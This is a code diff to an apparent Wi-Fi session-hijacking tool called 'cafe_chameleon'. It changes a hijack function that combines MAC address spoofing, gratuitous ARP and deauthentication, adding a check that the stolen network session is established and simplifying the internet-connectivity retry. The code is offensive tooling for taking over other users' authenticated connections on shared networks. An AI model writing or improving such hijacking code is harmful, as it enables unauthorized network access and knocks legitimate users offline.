@@ -14,7 +14,7 @@ from cafe_chameleon.network.nmcli import get_active_profile
 from cafe_chameleon.network.mac import set_mac_address
 from cafe_chameleon.network.arp import send_gratuitous_arp, start_background_garp
 from cafe_chameleon.network.deauth import send_deauth
-from cafe_chameleon.network.internet import has_internet, test_internet_speed, wait_for_gateway_pong
+from cafe_chameleon.network.internet import has_internet, test_internet_speed, wait_for_gateway_pong, wait_for_session_establishment
 
 
 def hijack(
@@ -125,18 +125,21 @@ def hijack(
                         if not gw_pong:
                             log_hijack("\033[91m[-] Gateway unreachable (No ping response)\033[0m")
                             return False
-                        log_hijack("[*] Gateway pong received -> Verifying internet connectivity...")
+                        log_hijack("[*] Gateway pong received -> Verifying network session establishment...")
+                        set_hijack_status(ip=ip, mac=mac, technique="Session Establishment Verification")
+                        sess_ok = wait_for_session_establishment(gateway_ip=gateway, interface=interface, timeout=3.0, log_cb=log_hijack)
+                        if sess_ok:
+                            set_hijack_status(ip=ip, mac=mac, technique="Session Active -> Verifying Internet")
+                        else:
+                            set_hijack_status(ip=ip, mac=mac, technique="Session Pending -> Verifying Internet")
                     else:
-                        log_hijack("[*] Gateway check skipped (--no-gateway) -> Verifying internet connectivity...")
+                        log_hijack("[*] Gateway check skipped (--no-gateway) -> Verifying network session establishment...")
+                        sess_ok = wait_for_session_establishment(gateway_ip=gateway, interface=interface, timeout=2.0, log_cb=log_hijack)
 
                     if gateway:
                         garp_stop_event = start_background_garp(interface, ip, gateway)
 
-                    has_base = has_internet(timeout=1.0, check_speed=False, gateway_ip=gateway, interface=interface, ping_gateway=False)
-                    if not has_base:
-                        # Give adapter network stack 1.5s grace period for ARP/DNS routing to settle
-                        time.sleep(1.5)
-                        has_base = has_internet(timeout=1.0, check_speed=False, gateway_ip=gateway, interface=interface, ping_gateway=False)
+                    has_base = has_internet(timeout=1.0, check_speed=False, gateway_ip=gateway, interface=interface, ping_gateway=False, wait_for_session=False)
 
                     if not has_base:
                         if attempt < max_retries:
